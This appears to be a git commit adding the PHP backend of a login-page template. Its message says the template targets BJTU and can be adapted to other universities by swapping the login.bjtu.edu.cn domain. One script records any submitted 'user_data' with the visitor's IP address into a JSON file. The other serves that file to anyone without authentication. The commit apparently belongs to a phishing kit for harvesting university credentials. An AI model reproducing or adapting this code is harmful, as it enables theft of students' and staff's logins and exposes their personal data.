a727c9fb86cb7ee2f5e4916fc6ade20bbdd8e148
10086mea <96985096+10086mea@users.noreply.github.com>
2024-10-20 02:55:23 +0800

    适用于BJTU的模板，其他学校需要修改login.bjtu.edu.cn为对应的login域名

---
+++ read_data.php
@@ -0,0 +1,13 @@
+<?php
+header('Content-Type: application/json');
+
+// 读取 user_data.json 的内容
+$file = __DIR__ . '/user_data.json';
+if (file_exists($file)) {
+    $jsonData = file_get_contents($file);
+    echo $jsonData;
+} else {
+    http_response_code(404);
+    echo json_encode(['message' => '数据文件未找到']);
+}
+?>
---
+++ store-data.php
@@ -0,0 +1,41 @@
+<?php
+header('Content-Type: application/json');
+date_default_timezone_set('Asia/Shanghai'); // 设置时区为上海时间
+// 获取POST请求中的数据
+$json = file_get_contents('php://input');
+$data = json_decode($json, true);
+
+// 获取用户的 IP 地址
+$ip_address = $_SERVER['REMOTE_ADDR'];
+
+if ($data && isset($data['user_data'])) {
+    $logEntry = [
+        'timestamp' => date('Y-m-d H:i:s'),
+        'ip_address' => $ip_address,
+        'user_data' => $data['user_data']
+    ];
+
+    // 指定文件路径
+    $file = __DIR__ . '/user_data.json';
+    $currentData = [];
+
+    // 读取现有的数据
+    if (file_exists($file)) {
+        $currentData = json_decode(file_get_contents($file), true);
+    }
+
+    // 添加新的数据
+    $currentData[] = $logEntry;
+
+    // 写入到 JSON 文件
+    if (file_put_contents($file, json_encode($currentData, JSON_PRETTY_PRINT))) {
+        echo json_encode(['message' => '数据成功存储']);
+    } else {
+        http_response_code(500);
+        echo json_encode(['message' => '数据存储失败']);
+    }
+} else {
+    http_response_code(400);
+    echo json_encode(['message' => '无效的数据']);
+}
+?>
